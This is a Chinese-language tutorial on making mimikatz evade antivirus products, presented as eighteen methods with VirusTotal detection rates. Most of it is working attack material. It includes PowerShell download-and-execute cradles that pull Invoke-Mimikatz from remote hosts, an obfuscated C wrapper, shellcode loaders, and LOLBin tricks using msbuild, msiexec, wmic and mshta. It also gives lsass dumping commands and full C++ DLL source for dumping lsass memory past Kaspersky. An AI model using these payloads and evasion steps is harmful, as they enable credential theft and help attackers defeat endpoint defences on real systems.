# mimikatz 提取用户凭证
下载地址在这里：http://blog.gentilkiwi.com/mimikatz


## 几种免杀绕过杀软的方式
### 方法1-加壳+签名+资源替换(VT查杀率9/70)

这里先介绍一种比较常见的pe免杀方法，就是替换资源+加壳+签名，有能力的还可以pe修改，而且mimikatz是开源的，针对源码进行免杀处理效果会更好，这里不多做讨论。

需要几个软件，VMProtect Ultimate 3.4.0加壳软件，下载链接: [https://pan.baidu.com/s/1VXaZgZ1YlVQW9P3B_ciChg](https://pan.baidu.com/s/1VXaZgZ1YlVQW9P3B_ciChg) 提取码: emnq

签名软件[https://raw.githubusercontent.com/TideSec/BypassAntiVirus/master/tools/mimikatz/sigthief.py](https://raw.githubusercontent.com/TideSec/BypassAntiVirus/master/tools/mimikatz/sigthief.py)

资源替换软件ResHacker：[https://github.com/TideSec/BypassAntiVirus/blob/master/tools/mimikatz/ResHacker.zip](https://github.com/TideSec/BypassAntiVirus/blob/master/tools/mimikatz/ResHacker.zip)

先替换资源，使用ResHacker打开mimikatz.exe，然后在图标里替换为360图标，version里面文字自己随意更改。

[![](_v_images/20200520173505029_4677.png)](https://.3001.net/_v_s/20200420/1587369606_5e9d56867030d.png)

安装vmp加壳软件后，使用vmp进行加壳

[![](_v_images/20200520173504521_19568.png)](https://.3001.net/_v_s/20200420/1587369614_5e9d568e0827e.png)

使用sigthief.py对上一步生成的exe文件进行签名。sigthief的详细用法可以参考[https://github.com/secretsquirrel/SigThief](https://github.com/secretsquirrel/SigThief)。

[![](_v_images/20200520173503712_1014.png)](https://.3001.net/_v_s/20200420/1587369621_5e9d5695f0aa4.png)

然后看看能不能运行，360和火绒都没问题。

[![](_v_images/20200520173503406_15465.png)](https://.3001.net/_v_s/20200420/1587369629_5e9d569d659fe.png)

VT平台上mimikatz32_360.exe文件查杀率9/70，缺点就是vmp加壳后会变得比较大。

[![](_v_images/20200520173502796_32347.png)](https://.3001.net/_v_s/20200420/1587369638_5e9d56a652ef4.png)

### 方法2-Invoke-Mimikatz(VT查杀率39/58)

当exe文件执行被拦截时，最常想到的就是使用PowerSploit中的Invoke-Mimikatz.ps1了。它虽然是powershell格式，但由于知名度太高，目前也是被查杀的惨不忍睹了。

可以去PowerSploit下载，也可以下载我打包的：

```
https://raw.githubusercontent.com/TideSec/BypassAntiVirus/master/tools/mimikatz/Invoke-Mimikatz.ps1
```

将Invoke-Mimikatz.ps1放在测试机上，本地执行

```
C:\WINDOWS\system32\WindowsPowerShell\v1.0\powershell.exe -exec bypass "import-module c:\test\Invoke-Mimikatz.ps1;Invoke-Mimikatz"
```

杀软会行为拦截，Invoke-Mimikatz.ps1脚本也会被查杀。

[![](_v_images/20200520173501988_8430.png)](https://.3001.net/_v_s/20200420/1587369647_5e9d56afa312a.png)

powershell脚本更方便的是可以进行远程加载

```
powershell.exe IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/TideSec/BypassAntiVirus/master/tools/mimikatz/Invoke-Mimikatz.ps1');Invoke-Mimikatz
```

不过由于raw.githubusercontent.com经常访问受限，所以可能会出现这种提示

[![](_v_images/20200520173501681_2243.png)](https://.3001.net/_v_s/20200420/1587369657_5e9d56b948d1c.png)

所以，最后是把相关代码放在自己的vps上，我就直接放我的内网另外的pc上了。

powershell依旧会被360行为拦截。

[![](_v_images/20200520173501373_26515.png)](https://.3001.net/_v_s/20200420/1587369664_5e9d56c06f028.png)

对可以尝试直使用下面的bypass方式，来自团队诺言大佬的文章[内网渗透-windows持久性后门](https://mp.weixin.qq.com/s/iFzYsWiWneAE_zGGZo7Miw)

```
powershell.exe -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal "IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/TideSec/BypassAntiVirus/master/tools/mimikatz/Invoke-Mimikatz.ps1');Invoke-Mimikatz"
```

不会触发powershell下载行为预警。

[![](_v_images/20200520173500965_26403.png)](https://.3001.net/_v_s/20200420/1587369672_5e9d56c839382.png)

virustotal.com上Invoke-Mimikatz.ps1脚本查杀率为39/58。

[![](_v_images/20200520173500657_17470.png)](https://.3001.net/_v_s/20200420/1587369679_5e9d56cfeabaa.png)

### 方法3-使用Out-EncryptedScript加密(VT查杀率0/60)

> 参考[https://www.jianshu.com/p/ed5074f8584b](https://www.jianshu.com/p/ed5074f8584b)

Powersploit中提供的很多工具都是做过加密处理的，同时也提供了一些用来加密处理的脚本，Out-EncryptedScript就是其中之一。

首先在本地对Invoke-Mimikatz.ps1进行加密处理：

先下载Out-EncryptedScript.ps1脚本，下载地址：[https://raw.githubusercontent.com/TideSec/BypassAntiVirus/master/tools/mimikatz/Out-EncryptedScript.ps1](https://raw.githubusercontent.com/TideSec/BypassAntiVirus/master/tools/mimikatz/Out-EncryptedScript.ps1)

在自己的电脑上依次执行

```
powershell.exe
Import-Module .\Out-EncryptedScript.ps1
Out-EncryptedScript -ScriptPath .\Invoke-Mimikatz.ps1 -Password tidesec -Salt 123456
```

默认会生成的evil.ps1文件。其中两个参数：-Password 设置加密的密钥-Salt 随机数，防止被暴力破解

[![](_v_images/20200520173459647_31713.png)](https://.3001.net/_v_s/20200420/1587369692_5e9d56dca90b4.png)

将加密生成的evil.ps1脚本放在目标机上，执行如下命令：

```
powershell.exe
IEX(New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/TideSec/BypassAntiVirus/master/tools/mimikatz/Out-EncryptedScript.ps1")
[String] $cmd = Get-Content .\evil.ps1
Invoke-Expression $cmd
$decrypted = de tidesec 123456
Invoke-Expression $decrypted
Invoke-Mimikatz
```

对evil.ps1文件进行查杀

[![](_v_images/20200520173458740_4382.png)](https://.3001.net/_v_s/20200420/1587369705_5e9d56e942978.png)

virustotal.com上evil.ps1文件查杀率为0/60。

[![](_v_images/20200520173458331_7496.png)](https://.3001.net/_v_s/20200420/1587369719_5e9d56f7d847c.png)

### 方法4-使用xencrypt加密(VT查杀率2/59)

该方法主要是使用工具对powershell脚本进行加密并采用Gzip/DEFLATE来绕过杀软。

工具地址[https://raw.githubusercontent.com/TideSec/BypassAntiVirus/master/tools/mimikatz/xencrypt.ps1](https://raw.githubusercontent.com/TideSec/BypassAntiVirus/master/tools/mimikatz/xencrypt.ps1)

下载Invoke-Mimikatz.ps1

```
https://raw.githubusercontent.com/TideSec/BypassAntiVirus/master/tools/mimikatz/Invoke-Mimikatz.ps1
```

将xencrypt.ps1也放在同一目录

在powershell中执行

```
Import-Module ./xencrypt.ps1
Invoke-Xencrypt -InFile .\Invoke-Mimikatz.ps1 -OutFile mimi.ps1 -Iterations 88
```

[![](_v_images/20200520173458024_17185.png)](https://.3001.net/_v_s/20200420/1587369730_5e9d5702d429f.png)

生成mimi.ps1

执行

```
C:\WINDOWS\system32\WindowsPowerShell\v1.0\powershell.exe -exec bypass "import-module c:\test\mimi.ps1;Invoke-Mimikatz"
```

[![](_v_images/20200520173457718_18517.png)](https://.3001.net/_v_s/20200420/1587369739_5e9d570bad221.png)

[![](_v_images/20200520173457311_11106.png)](https://.3001.net/_v_s/20200420/1587369748_5e9d5714a4c61.png)

virustotal.com上mimi.ps1文件查杀率为2/59。

[![](_v_images/20200520173456702_20145.png)](https://.3001.net/_v_s/20200420/1587369761_5e9d572108a13.png)

### 方法5-PowerShell嵌入EXE文件(VT查杀率15/58)

这个方法其实只是将exe程序转为字符串，然后嵌入到Invoke-ReflectivePEInjection.ps1中直接执行。参考[https://www.freebuf.com/articles/terminal/99631.html](https://www.freebuf.com/articles/terminal/99631.html)

将下面代码保存为Convert-BinaryToString.ps1

```
function Convert-BinaryToString {
   [CmdletBinding()] param (
      [string] $FilePath
   )
   try {
      $ByteArray = [System.IO.File]::ReadAllBytes($FilePath);
   }
   catch {
      throw "Failed to read file. Ensure that you have permission to the file, and that the file path is correct.";
   }
   if ($ByteArray) {
      $Base64String = [System.Convert]::ToBase64String($ByteArray);
   }
   else {
      throw '$ByteArray is $null.';
   }
   Write-Output -InputObject $Base64String
}
```

执行powershell import-module .\\Convert-BinaryToString.ps1 ; Convert-BinaryToString .\\mimikatz.exe >>1.txt

下载Invoke-ReflectivePEInjection.ps1，这个是Empire里的，可以使用PEUrl参数。[https://raw.githubusercontent.com/TideSec/BypassAntiVirus/master/tools/mimikatz/Invoke-ReflectivePEInjection.ps1](https://raw.githubusercontent.com/TideSec/BypassAntiVirus/master/tools/mimikatz/Invoke-ReflectivePEInjection.ps1)

新建一个payload.ps1，内容如下，需要替换里面1.txt的内容和Invoke-ReflectivePEInjection内容。

```
# Your base64 encoded binary
$InputString = '...........'  #上面1.txt的内容
function Invoke-ReflectivePEInjection  #Invoke-ReflectivePEInjection的内容
{
   ......
   ......
   ......
}
# Convert base64 string to byte array
$PEBytes = [System.Convert]::FromBase64String($InputString)
# Run EXE in memory
Invoke-ReflectivePEInjection -PEBytes $PEBytes -ExeArgs "Arg1 Arg2 Arg3 Arg4"
```

然后在目标机器执行powershell -ExecutionPolicy Bypass -File payload.ps1即可。

[![](_v_images/20200520173456395_23902.png)](https://.3001.net/_v_s/20200420/1587369772_5e9d572c9c249.png)

打开杀软发现静态查杀都过不了，其实这个也正常，Invoke-ReflectivePEInjection这个知名度太高了。

[![](_v_images/20200520173456087_19481.png)](https://.3001.net/_v_s/20200420/1587369783_5e9d5737d9711.png)

如果保错PE platform doesn’t match the architecture of the process it is being loaded in (32/64bit)

说明使用32位的powershell才行%windir%\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe -ExecutionPolicy Bypass -File payload.ps1

virustotal.com上payload.ps1文件查杀率为15/58。

[![](_v_images/20200520173455678_8946.png)](https://.3001.net/_v_s/20200420/1587369793_5e9d5741ba577.png)

### 方法6-C程序中执行powershell(VT查杀率7/71)

这个执行方式也是比较简单，在C代码里执行powershell。

先借用Invoke-Mimikatz.ps1

```
powershell $c2='IEX (New-Object Net.WebClient).Downlo';$c3='adString(''http://10.211.55.2/mimikatz/Invoke-Mimikatz.ps1'')'; $Text=$c2+$c3; IEX(-join $Text);Invoke-Mimikatz
```

使用c语言的system函数去执行powershell。

```
#include<stdio.h>
#include<stdlib.h>
int main(){
system("powershell $c2='IEX (New-Object Net.WebClient).Downlo';$c3='adString(''http://10.211.55.2/mimikatz/Invoke-Mimikatz.ps1'')'; $Text=$c2+$c3; IEX(-join $Text);Invoke-Mimikatz");
return 0;
}
```

[![](_v_images/20200520173454655_26500.png)](https://.3001.net/_v_s/20200420/1587369804_5e9d574c2dcbb.png)

编译为exe文件，达到免杀的目的。但在运行该exe时，会触发360报警。

[![](_v_images/20200520173454449_14967.png)](https://.3001.net/_v_s/20200420/1587369814_5e9d575681f20.png)

virustotal.com上Project1.exe文件查杀率为7/71。

[![](_v_images/20200520173453140_14018.png)](https://.3001.net/_v_s/20200420/1587369826_5e9d57627a379.png)

### 方法7-使用加载器pe\_to\_shellcode(VT查杀率47/70)

下载[https://github.com/hasherezade/pe\_to\_shellcode](https://github.com/hasherezade/pe_to_shellcode)

将mimikatz.exe转化为shellcodepe2shc.exe mimikatz.exe mimi.txt

加载runshc64.exe mimi.txt

[![](_v_images/20200520173452833_110.png)](https://.3001.net/_v_s/20200420/1587369835_5e9d576b41d22.png)

virustotal.com上mimi.txt文件查杀率为47/70，额，看来这个已经被列入黑名单了。

[![](_v_images/20200520173452223_5998.png)](https://.3001.net/_v_s/20200420/1587369845_5e9d57755eac1.png)

### 方法8-c#加载shellcode(VT查杀率21/57)

参考远控免杀专题(38)-白名单Rundll32.exe执行payload(VT免杀率22-58)[https://mp.weixin.qq.com/s/rm**AWC6HmcphozfEZhRGA](https://mp.weixin.qq.com/s/rm**AWC6HmcphozfEZhRGA)

先使用上面介绍的pe\_to\_shellcode方法，把mimikatz.exe转换为mimi.txt

然后使用bin2hex.exe将mimi.txt转换为16进制文件，bin2hex.exe可在这里下载到[https://github.com/TideSec/BypassAntiVirus/blob/master/tools/bin2hex.exe](https://github.com/TideSec/BypassAntiVirus/blob/master/tools/bin2hex.exe)

```
bin2hex.exe --i mimi.txt --o mimi2.txt
```

[![](_v_images/20200520173451014_28063.png)](https://.3001.net/_v_s/20200420/1587369857_5e9d5781b38c5.png)

在vs2017中创建C#的Console工程，把mimi2.txt中的16进制放到下面代码中的MsfPayload中。

```
using System;
using System.Threading;
using System.Runtime.InteropServices;
namespace MSFWrapper
{
    public class Program
    {
        public Program()
        {
            RunMSF();
        }
        public static void RunMSF()
        {
            byte[] MsfPayload =  {
0x4D, 0x5A, 0x45, 0x52, 0xE8, 0x00, 0x00, 0x00, 0x00, 0x5B, 0x48, 0x83,
0x41, 0x59, 0x41, 0x58, 0x41, 0x5C, 0x5F, 0x5E, 0x5B, 0xC2, 0x04, 0x00 };
            IntPtr returnAddr = VirtualAlloc((IntPtr)0, (uint)Math.Max(MsfPayload.Length, 0x1000), 0x3000, 0x40);
            Marshal.Copy(MsfPayload, 0, returnAddr, MsfPayload.Length);
            CreateThread((IntPtr)0, 0, returnAddr, (IntPtr)0, 0, (IntPtr)0);
            Thread.Sleep(2000);
        }
        public static void Main()
        {
        }
        [DllImport("kernel32.dll")]
        public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
        [DllImport("kernel32.dll")]
        public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
    }
}
```

编译生成exe文件。

[![](_v_images/20200520173450506_1635.png)](https://.3001.net/_v_s/20200420/1587369869_5e9d578d31299.png)

然后使用DotNetToJScript把csharp文件转为js

```
DotNetToJScript.exe -l=JScript -o=mimikatz.js -c=MSFWrapper.Program ConsoleApp1.exe
```

使用cscript.exe mimikatz.js进行执行。

[![](_v_images/20200520173450186_19351.png)](https://.3001.net/_v_s/20200420/1587369879_5e9d57971a03f.png)

virustotal.com上mimi.txt文件查杀率为21/57。

[![](_v_images/20200520173449677_32544.png)](https://.3001.net/_v_s/20200420/1587369889_5e9d57a1f3b25.png)

### 方法9-Donut执行mimikatz(VT查杀率29/71)

先使用donut把mimiktaz.exe转为bin文件。

```
donut.exe -f mimikatz.exe -o mimi.bin
```

[![](_v_images/20200520173449370_31978.png)](https://.3001.net/_v_s/20200420/1587369904_5e9d57b08c3a8.png)

将mimi.bin作base64编码并保存在剪贴板，powershell命令如下：

```
$filename = "mimi.bin"
[Convert]::ToBase64String([IO.File]::ReadAllBytes($filename)) | clip
```

把base64编码复制到DonutTest工程中。

[![](_v_images/20200520173448364_18098.png)](https://.3001.net/_v_s/20200420/1587369917_5e9d57bd05809.png)

编译生成exe。

在注入进程时，发现注入到notepad.exe中无法执行，但注入到powershell中可以执行。

[![](_v_images/20200520173447755_932.png)](https://.3001.net/_v_s/20200420/1587369939_5e9d57d32571a.png)

但是发现仍被查杀。

[![](_v_images/20200520173447446_18972.png)](https://.3001.net/_v_s/20200420/1587369947_5e9d57db7162f.png)

VT查杀率29/71，怎一个惨字了得。

[![](https://www.freebuf.com/buf/themes/freebuf/_v_s/grey.gif)](https://.3001.net/_v_s/20200420/1587369956_5e9d57e4ec7fc.png)

### 方法10-msf加载bin(VT查杀率2/59)

Donut下载[https://github.com/TheWover/donut](https://github.com/TheWover/donut)

下载shellcode_inject.rb代码[https://raw.githubusercontent.com/TideSec/BypassAntiVirus/master/tools/mimikatz/shellcode_inject.rb](https://raw.githubusercontent.com/TideSec/BypassAntiVirus/master/tools/mimikatz/shellcode_inject.rb)

1、首先使用Donut对需要执行的文件进行shellcode生成,这里对mimi进行shellcode生成,生成bin文件,等下会用到。

```
donut.exe -f mimikatz.exe -a 2 -o mimi.bin
```

[![](_v_images/20200520173446827_20136.png)](https://.3001.net/_v_s/20200420/1587369971_5e9d57f3ea9c7.png)

windows下的0.9.3版本的donut没能生成，于是使用了0.9.2版本。

kali下的0.9.3可正常使用。

2、将上面的shellcode\_inject.rb放入/opt/metasploit-framework/embedded/framework/modules/post/windows/manage下(实际路径可能不同,也就是metasploit-framework的上级路径,根据实际情况调整),然后进入msf,reload\_all同时载入所有模块。

kali里是在目录/usr/share/metasploit-framework/modules/post/windows/manage/

mac下是在/opt/metasploit-framework/embedded/framework/modules/post/windows/manage

**![](_v_images/20200520173446620_3180.png)![](_v_images/20200520173446213_15388.png)**

3、使用之前载入的shellcode_inject注入模块,这里是获取session后的操作了,session先自己上线再进行以下操作

```
use post/windows/manage/shellcode_inject
set session 2
set shellcode /tmp/payload.bin
run
```

最后成功加载了mimi,使用shellcode注入执行,有更强的隐蔽性。

![](https://www.freebuf.com/buf/themes/freebuf/_v_s/grey.gif)

VT平台上mimi.bin文件查杀率2/59，卡巴斯基这都能查杀…

![](_v_images/20200520173445805_25651.png)

### 方法11-用C#加载mimikatz(VT查杀率35/73)

参考[https://www.jianshu.com/p/12242d82b2df](https://www.jianshu.com/p/12242d82b2df)

参考远控免杀专题(29)-C#加载shellcode免杀-5种方式(VT免杀率8-70)：[https://mp.weixin.qq.com/s/Kvhfb13d2_D6m-Bu9Darog](https://mp.weixin.qq.com/s/Kvhfb13d2_D6m-Bu9Darog)

下载

```
https://raw.githubusercontent.com/TideSec/BypassAntiVirus/master/tools/mimikatz/katz.cs
```

将katz.cs放置C:\\Windows\\Microsoft.NET\\Framework\\v2.0.50727先powoershell执行

```
$key = 'BwIAAAAkAABSU0EyAAQAAAEAAQBhXtvkSeH85E31z64cAX+X2PWGc6DHP9VaoD13CljtYau9SesUzKVLJdHphY5ppg5clHIGaL7nZbp6qukLH0lLEq/vW979GWzVAgSZaGVCFpuk6p1y69cSr3STlzljJrY76JIjeS4+RhbdWHp99y8QhwRllOC0qu/WxZaffHS2te/PKzIiTuFfcP46qxQoLR8s3QZhAJBnn9TGJkbix8MTgEt7hD1DC2hXv7dKaC531ZWqGXB54OnuvFbD5P2t+vyvZuHNmAy3pX0BDXqwEfoZZ+hiIk1YUDSNOE79zwnpVP1+BN0PK5QCPCS+6zujfRlQpJ+nfHLLicweJ9uT7OG3g/P+JpXGN0/+Hitolufo7Ucjh+WvZAU//dzrGny5stQtTmLxdhZbOsNDJpsqnzwEUfL5+o8OhujBHDm/ZQ0361mVsSVWrmgDPKHGGRx+7FbdgpBEq3m15/4zzg343V9NBwt1+qZU+TSVPU0wRvkWiZRerjmDdehJIboWsx4V8aiWx8FPPngEmNz89tBAQ8zbIrJFfmtYnj1fFmkNu3lglOefcacyYEHPX/tqcBuBIg/cpcDHps/6SGCCciX3tufnEeDMAQjmLku8X4zHcgJx6FpVK7qeEuvyV0OGKvNor9b/WKQHIHjkzG+z6nWHMoMYV5VMTZ0jLM5aZQ6ypwmFZaNmtL6KDzKv8L1YN2TkKjXEoWulXNliBpelsSJyuICplrCTPGGSxPGihT3rpZ9tbLZUefrFnLNiHfVjNi53Yg4='
$Content = [System.Convert]::FromBase64String($key)
Set-Content  key.snk -Value $Content -Encoding Byte
```

再cmd执行

```
C:\Windows\Microsoft.NET\Framework\v2.0.50727\csc.exe /r:System.EnterpriseServices.dll /out:katz.exe /keyfile:key.snk /unsafe katz.cs
C:\Windows\Microsoft.NET\Framework\v2.0.50727\regsvcs.exe katz.exe
```

运行时需要管理员权限，而且360会拦截

![](https://www.freebuf.com/buf/themes/freebuf/_v_s/grey.gif)

放行后可正常执行

![](https://www.freebuf.com/buf/themes/freebuf/_v_s/grey.gif)

virustotal.com上katz.exe查杀率为35/73，略惨。

![](https://www.freebuf.com/buf/themes/freebuf/_v_s/grey.gif)

### 方法12-JS加载mimikatz(VT查杀率22/59)

参考远控免杀专题(38)-白名单Rundll32.exe执行payload(VT免杀率22-58)：[https://mp.weixin.qq.com/s/rm**AWC6HmcphozfEZhRGA](https://mp.weixin.qq.com/s/rm**AWC6HmcphozfEZhRGA)

这个是大佬已经做好的payload，可以直接进行使用。

用DotNetToJScript实现

```
https://github.com/tyranid/DotNetToJScript
```

mimikatz

```
https://raw.githubusercontent.com/TideSec/BypassAntiVirus/master/tools/mimikatz/mimikatz.js
```

执行cscript mimikatz.js，360会拦截。

![](https://www.freebuf.com/buf/themes/freebuf/_v_s/grey.gif)

放行后可正常执行

![](https://www.freebuf.com/buf/themes/freebuf/_v_s/grey.gif)

virustotal.com上mimikatz.js查杀率为22/59。

![](https://www.freebuf.com/buf/themes/freebuf/_v_s/grey.gif)

### 方法13-msiexec加载mimikatz(VT查杀率25/60)

参考远控免杀专题(35)-白名单Msiexec.exe执行payload(VT免杀率27-60)：[https://mp.weixin.qq.com/s/XPrBK1Yh5ggO-PeK85mqcg](https://mp.weixin.qq.com/s/XPrBK1Yh5ggO-PeK85mqcg)

使用Advanced Installer生成msi文件。

远程执行

```
msiexec.exe /passive /i https://raw.githubusercontent.com/TideSec/BypassAntiVirus/master/tools/mimikatz/mimikatz.msi /norestart
```

![](https://www.freebuf.com/buf/themes/freebuf/_v_s/grey.gif)

本地执行

```
msiexec /passive /i Mimikatz.msi
```

![](https://www.freebuf.com/buf/themes/freebuf/_v_s/grey.gif)

virustotal.com上mimikatz.msi查杀率为25/60。

![](https://www.freebuf.com/buf/themes/freebuf/_v_s/grey.gif)

### 方法14-白名单msbuild.exe加载(VT查杀率4/59)

可参考之前的远控免杀专题(34)-白名单MSBuild.exe执行payload(VT免杀率4-57)：[https://mp.weixin.qq.com/s/1WEglPXm1Q5n6T-c4OhhXA](https://mp.weixin.qq.com/s/1WEglPXm1Q5n6T-c4OhhXA)

下载mimikatz.xml

```
https://raw.githubusercontent.com/TideSec/BypassAntiVirus/master/tools/mimikatz/executes-mimikatz.xml
```

执行

```
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\msbuild.exe executes-mimikatz.xml
```

火绒会预警，360不会

![](https://www.freebuf.com/buf/themes/freebuf/_v_s/grey.gif)

virustotal.com上executes-mimikatz.xml查杀率为4/59。

![](https://www.freebuf.com/buf/themes/freebuf/_v_s/grey.gif)

### 方法15-JScript的xsl版(VT查杀率7/60)

下载

```
https://raw.githubusercontent.com/TideSec/BypassAntiVirus/master/tools/mimikatz/mimikatz.xsl
```

本地加载

```
wmic os get /format:"mimikatz.xsl"
```

远程加载

```
wmic os get /format:"https://raw.githubusercontent.com/TideSec/BypassAntiVirus/master/tools/mimikatz/mimikatz.xsl"
```

![](https://www.freebuf.com/buf/themes/freebuf/_v_s/grey.gif)

放行后

![](https://www.freebuf.com/buf/themes/freebuf/_v_s/grey.gif)

virustotal.com上mimikatz.xsl查杀率为7/60。

![](https://www.freebuf.com/buf/themes/freebuf/_v_s/grey.gif)

### 方法16-jscript的sct版(VT查杀率23/59)

参考远控免杀专题(37)-白名单Mshta.exe执行payload(VT免杀率26-58)：[https://mp.weixin.qq.com/s/oBr-syv2ef5IjeGFrs7sHg](https://mp.weixin.qq.com/s/oBr-syv2ef5IjeGFrs7sHg)

下载

```
https://raw.githubusercontent.com/TideSec/BypassAntiVirus/master/tools/mimikatz/mimikatz.sct
```

执行

```
mshta.exe javascript:a=GetObject("script:https://raw.githubusercontent.com/TideSec/BypassAntiVirus/master/tools/mimikatz/mimikatz.sct").Exec(); log coffee exit
```

360拦截依旧

![](https://www.freebuf.com/buf/themes/freebuf/_v_s/grey.gif)

virustotal.com上mimikatz.sct查杀率为23/59。

![](https://www.freebuf.com/buf/themes/freebuf/_v_s/grey.gif)

### 方法17-ReflectivePEInjection加载(VT查杀率32/57)

ReflectivePEInjection是powersploit里的比较有名的一个pe加载脚本，很好使。

下载

```
https://raw.githubusercontent.com/TideSec/BypassAntiVirus/master/tools/mimikatz/Invoke-ReflectivePEInjection.ps1
```

执行

```
powershell.exe -exec bypass IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/TideSec/BypassAntiVirus/master/tools/mimikatz/Invoke-ReflectivePEInjection.ps1');Invoke-ReflectivePEInjection -PEUrl "http://10.211.55.2/mimikatz/x64/mimikatz.exe" -ExeArgs "sekurlsa::logonpasswords" -ForceASLR
```

![](https://www.freebuf.com/buf/themes/freebuf/_v_s/grey.gif)

这个用什么来衡量免杀都不太合适，我就用Invoke-ReflectivePEInjection.ps1吧。在virustotal.com上Invoke-ReflectivePEInjection.ps1查杀率为32/57。

![](https://www.freebuf.com/buf/themes/freebuf/_v_s/grey.gif)

### 方法18-导出lsass进程离线读密码(VT查杀率0/72)

windows有多款官方工具可以导出lsass进程的内存数据，比如procdump.exe、SqlDumper.exe、Out-Minidump.ps1等，我这里以procdump.exe为例进行演示。

procdump.exe工具是微软出品的工具，具有一定免杀效果。可以利用procdump把lsass进程的内存文件导出本地，再在本地利用mimikatz读取密码。

procdump.exe下载[https://github.com/TideSec/BypassAntiVirus/tree/master/tools/mimikatz/procdump.exe](https://github.com/TideSec/BypassAntiVirus/tree/master/tools/mimikatz/procdump.exe)


在目标机器执行下面命令，导出lsass.dmp

```
procdump.exe -accepteula -ma lsass.exe lsass.dmp
```
再使用mimikatz读取密码

```
mimikatz.exe "sekurlsa::minidump lsass.dmp" "sekurlsa::logonPasswords full" exit
```

SqlDumper.exe
SqlDumper也属于微软出品，存在于SQL Server文件夹中，大多数杀软不会拦截。  
默认存放在C:\\Program Files\\Microsoft SQL Server\\number\\Shared，number代表SQL Server的版本。  
如果目标机器没有安装SQL Server，可以自己上传SqlDumper.exe。

```
tasklist /svc | findstr lsass.exe  查看lsass.exe 的PID号  
Sqldumper.exe ProcessID 0 0x01100  导出mdmp文件  
```
实战中下把生成的mdmp文件下载到本地，使用相同的操作系统打开。

```
mimikatz.exe "sekurlsa::minidump SQLDmpr0001.mdmp" "sekurlsa::logonPasswords full" exit  
```
可过360，无法过卡巴斯基。

**需要注意的是从目标机器导出的lsass.dmp需要在相同系统下运行**。

在virustotal.com上procdump.exe查杀率为0/72，不过这种读取lsass的行为早就被各大杀软拦截了，所以这种静态查杀没有太大参考价值。
诺言大佬写过一篇可绕过卡巴斯基获取hash的方法，可以看这个[https://mp.weixin.qq.com/s/WLP1soWz-_BEouMxTHLbzg](https://mp.weixin.qq.com/s/WLP1soWz-_BEouMxTHLbzg):


### 绕过卡巴斯基抓取lsass中密码

卡巴斯基对lsass.exe防护相当变态，上面的几种方法都无法绕过卡巴斯基。  
使用国外大佬XPN使用RPC控制lsass加载SSP的代码，https://gist.github.com/xpn/c7f6d15bf15750eae3ec349e7ec2380e  将三个文件下载到本地，使用visual studio进行编译，需要修改了几个地方。  
（1）添加如下代码

```
#pragma comment(lib, "Rpcrt4.lib") （引入Rpcrt4.lib库文件）  
```
（2）将.c文件后缀改成.cpp （使用了c++代码，需要更改后缀）  
（3) 编译时选择x64 （XPN大佬提供的是64位代码）  
编译代码得到.exe文件。  
然后用生成的exe，加载dump内存的dll文件，这里使用的是奇安信A-team团队公布的源码，并在基础上，增加了自动获取lsass的PID号功能，无需每次使用重复编译。  
dll源码如下：

```
#include <cstdio>  
#include <windows.h>  
#include <DbgHelp.h>  
#include <iostream>  
#include <string>  
#include <map>  
#include <TlHelp32.h>  
  
#pragma comment(lib,"Dbghelp.lib")  
using namespace std;  
  
int FindPID()  
{  
    PROCESSENTRY32 pe32;  
    pe32.dwSize = sizeof(pe32);  
  
    HANDLE hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);  
    if (hProcessSnap == INVALID\_HANDLE\_VALUE) {  
        cout << "CreateToolhelp32Snapshot Error!" << endl;;  
        return false;  
    }  
  
    BOOL bResult = Process32First(hProcessSnap, &pe32);  
  
    while (bResult)  
    {  
        if (_wcsicmp(pe32.szExeFile, L"lsass.exe") == 0)  
        {  
            return pe32.th32ProcessID;  
        }  
        bResult = Process32Next(hProcessSnap, &pe32);  
    }  
  
    CloseHandle(hProcessSnap);  
  
    return -1;  
}  
  
typedef HRESULT(WINAPI* _MiniDumpW)(  
    DWORD arg1, DWORD arg2, PWCHAR cmdline);  
  
typedef NTSTATUS(WINAPI* _RtlAdjustPrivilege)(  
    ULONG Privilege, BOOL Enable,  
    BOOL CurrentThread, PULONG Enabled);  
  
int dump() {  
  
    HRESULT             hr;  
    _MiniDumpW          MiniDumpW;  
    _RtlAdjustPrivilege RtlAdjustPrivilege;  
    ULONG               t;  
  
    MiniDumpW = (_MiniDumpW)GetProcAddress(  
        LoadLibrary(L"comsvcs.dll"), "MiniDumpW");  
  
    RtlAdjustPrivilege = (_RtlAdjustPrivilege)GetProcAddress(  
        GetModuleHandle(L"ntdll"), "RtlAdjustPrivilege");  
  
    if (MiniDumpW == NULL) {  
  
        return 0;  
    }  
    *// try enable debug privilege*  
    RtlAdjustPrivilege(20, TRUE, FALSE, &t);  
  
    wchar_t  ws\[100\];  
    swprintf(ws, 100, L"%hd%hs", FindPID(), " C:\\\1.bin full");  
  
    MiniDumpW(0, 0, ws);  
    return 0;  
  
}  
BOOL APIENTRY DllMain(HMODULE hModule, DWORD  ul\_reason\_for_call, LPVOID lpReserved) {  
    switch (ul\_reason\_for_call) {  
    case DLL\_PROCESS\_ATTACH:  
        dump();  
        break;  
    case DLL\_THREAD\_ATTACH:  
    case DLL\_THREAD\_DETACH:  
    case DLL\_PROCESS\_DETACH:  
        break;  
    }  
    return TRUE;  
}  
```

在测试机中安装卡巴斯基进行测试,使用Procdump会被拦截。 把编译好的文件exe和dll放在同一目录下。 使用管理员权限运行exe，加载dll文件。  
存在三个需要注意的点：  
1、调用dll文件要是完整的绝对路径  
2、文件要放在英文路径下  
